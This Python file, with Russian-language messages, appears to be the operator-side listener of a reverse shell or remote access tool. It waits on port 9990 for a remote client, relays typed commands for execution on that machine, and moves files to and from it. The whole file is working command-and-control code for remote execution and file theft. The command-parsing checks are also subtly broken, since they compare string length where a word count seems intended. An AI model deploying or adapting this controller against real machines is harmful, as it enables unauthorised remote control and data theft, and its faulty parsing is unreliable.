from datetime import datetime
import json
import socket 
import base64
from typing import List
import os

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
listener.bind(("0.0.0.0", 9990))
listener.listen(0)
print("[+] Waiting for incoming connections")
cl_socket, remote_address = listener.accept()                  
print(f"[+] Got a connection from {remote_address} ")

def download_from_client(command):              
    _, _, file, newpath = command.split(' ')
    cl_socket.send(command.encode())                    
    file = cl_socket.recv(1572864)                         
    message = file.decode()
    if("Error:" in message):
        print(message)
    else:
        path=newpath.split('/')
        n=len(path)
        pathdir:str = ""
        for i in range(n-1):
            pathdir=pathdir+path[i]+"/"
        if not os.path.exists(pathdir):
            os.makedirs(pathdir)
        with open((newpath),"wb") as output_file:
            output_file.write(base64.b64decode(file))       
        print(f"Файл скачен на сервер по пути {newpath}")

def download_from_server(command):              
    _, file, newpath = command.split()
    try:
        with open(file, "+rb") as file:
            file=base64.b64encode(file.read())              
        cl_socket.send(f"dl {newpath}".encode())            
        cl_socket.send(file)                                
        response = cl_socket.recv(1024).decode()            
        print(response)
    except(Exception) as e:
        print(e)

def console_command(command):                   
    cl_socket.send(command.encode())                    
    response = cl_socket.recv(1024).decode()            
    print(response)

def interact_console():                        
    try:

        while True:
            command :str = input(">> ")             
            if "upd" in command:                     
                if ("dwd" in command and len(command)==4):
                    download_from_client(command)   
                elif(len(command)==3):
                    download_from_server(command)   
                else:
                    print("Неправильный формат команды. Пример команды: upd «dwd» «путь к файлу» «новый путь файла»")
            else:
                console_command(command)           
            
    except KeyboardInterrupt:                       
        listener.close()
        exit()

interact_console()